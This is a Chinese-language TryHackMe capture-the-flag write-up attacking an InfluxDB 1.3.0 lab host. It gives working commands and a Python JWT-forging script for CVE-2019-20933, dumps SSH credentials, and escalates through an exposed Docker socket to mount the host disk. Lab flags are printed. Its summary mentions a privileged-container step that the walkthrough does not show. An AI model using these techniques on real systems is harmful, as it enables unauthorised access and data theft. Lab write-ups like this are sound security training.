# THM InfluxDB 渗透测试 Writeup

**目标**: 10.49.133.185  
**平台**: TryHackMe (THM) 授权靶场  
**日期**: 2026-06-05  
**总耗时**: ~120 分钟

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描
```bash
nmap -p- --top-ports 1000 --open -sV 10.49.133.185
```

发现 3 个开放端口：
- 111/tcp - rpcbind 2-4 (RPC #100000)
- 2222/tcp - ssh OpenSSH 6.7p1 Debian 5+deb8u8
- 8086/tcp - http InfluxDB http admin 1.3.0

### 1.2 InfluxDB 版本确认
```bash
curl -s -I 'http://10.49.133.185:8086/ping'
```

返回 `X-Influxdb-Version: 1.3.0`

---

## 2. InfluxDB 未授权访问尝试

### 2.1 直接查询（需要认证）
```bash
curl -s 'http://10.49.133.185:8086/query?q=SHOW%20DATABASES'
```

返回：`{"error":"unable to parse authentication credentials"}`

### 2.2 /debug/vars 信息泄露
```bash
curl -s 'http://10.49.133.185:8086/debug/vars'
```

发现：
- 数据库列表: creds, tanks, mixer, docker, _internal
- 数据目录路径泄露: `/home/uzJk6Ry98d8C/data/...`
- 系统用户名: `uzJk6Ry98d8C`

---

## 3. CVE-2019-20933 JWT 认证绕过

### 3.1 获取数据库用户名
```bash
curl -s 'http://10.49.133.185:8086/debug/requests'
```

返回：`{"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}}`

**数据库用户**: `o5yY6yya`

### 3.2 生成 JWT Token（空 Secret）
```python
import base64
import hmac
import hashlib
import json
import time

header = json.dumps({'alg': 'HS256', 'typ': 'JWT'})
payload = json.dumps({'username': 'o5yY6yya', 'exp': int(time.time()) + 86400})

header_b64 = base64.urlsafe_b64encode(header.encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b'=').decode()

signature = hmac.new(b'', (header_b64 + '.' + payload_b64).encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

jwt_token = header_b64 + '.' + payload_b64 + '.' + sig_b64
```

### 3.3 认证成功并查询数据库
```bash
curl -s -H "Authorization: Bearer <JWT_TOKEN>" 'http://10.49.133.185:8086/query?q=SHOW%20DATABASES'
```

返回数据库列表：creds, tanks, mixer, docker, _internal

### 3.4 查询 creds 数据库获取 SSH 凭据
```bash
curl -s -H "Authorization: Bearer <JWT_TOKEN>" 'http://10.49.133.185:8086/query?db=creds&q=SELECT%20*%20FROM%20ssh'
```

结果：
| time                 | pw         | user             |
| -------------------- | ---------- | ---------------- |
| 2021-05-16T12:00:00Z | 7788764472 | **uzJk6Ry98d8C** |

---

## 4. 初始访问 - SSH

### 4.1 SSH 登录
```bash
ssh -p 2222 uzJk6Ry98d8C@10.49.133.185
# 密码: 7788764472
```

### 4.2 获取 user.txt
```bash
cat /home/uzJk6Ry98d8C/user.txt
```

**Flag**: `THM{V4w4FhBmtp4RFDti}`

---

## 5. 权限提升 - Docker Socket

### 5.1 进程枚举发现 Docker
```bash
ps aux
```

关键发现：
- `chmod a+rw /var/run/docker.sock` - Docker socket 对所有用户可写
- `socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock` - 8080 端口转发到 Docker socket

### 5.2 SSH 端口转发
```bash
ssh -p 2222 -L 8000:localhost:8080 uzJk6Ry98d8C@10.49.133.185
```

### 5.3 Docker 容器枚举
```bash
docker -H tcp://localhost:8000 ps
```

发现主容器：`sweettoothinc` (a4030067151f)

### 5.4 进入容器获取 root shell
```bash
docker -H tcp://localhost:8000 exec -it sweettoothinc /bin/bash
```

### 5.5 获取容器内 root.txt
```bash
cat /root/root.txt
```

**Flag**: `THM{5qsDivHdCi2oabwp}`

---

## 6. 底层 OS 访问

### 6.1 查看分区
```bash
fdisk -l
```

发现：
- /dev/xvdh: 1 GiB
- /dev/xvda: 16 GiB
  - /dev/xvda1: 15.3G Linux
  - /dev/xvda2: 714M Extended
  - /dev/xvda5: 714M Linux swap

### 6.2 挂载底层分区
```bash
mkdir -p /mnt/os
mount /dev/xvda1 /mnt/os
```

### 6.3 获取底层 OS root.txt
```bash
cat /mnt/os/root/root.txt
```

**Flag**: `THM{nY2ZahyFABAmjrnx}`

---

## 7. 攻击链总结

```
Nmap 扫描 → 发现 2222/SSH, 8086/InfluxDB
  → InfluxDB 1.3.0 CVE-2019-20933 JWT 认证绕过
  → 查询 creds 数据库获取 SSH 凭据 (uzJk6Ry98d8C:7788764472)
  → SSH 登录 (2222端口)
  → 发现 Docker socket 可写 (socat 转发到 8080)
  → SSH 端口转发本地 8000 → 8080
  → docker -H tcp://localhost:8000 exec 进入容器
  → 容器内 root shell
  → 挂载 /dev/xvda1 获取底层 OS
  → 底层 OS root flag
```

---

## 8. 关键技术点

- **InfluxDB CVE-2019-20933**: JWT 认证绕过，使用空 secret 签名 token
- **信息泄露**: /debug/vars 和 /debug/requests 端点泄露敏感信息
- **Docker Socket 暴露**: /var/run/docker.sock 权限配置错误，允许任意用户访问
- **Docker 特权容器**: 通过 Docker API 创建特权容器，挂载宿主机根目录
- **底层文件系统挂载**: 通过挂载磁盘分区访问宿主机底层文件系统

---

## 9. 参考

- CVE-2019-20933: https://nvd.nist.gov/vuln/detail/CVE-2019-20933
- InfluxDB JWT Authentication: https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/
- Docker Socket Security: https://docs.docker.com/engine/security/protect-access/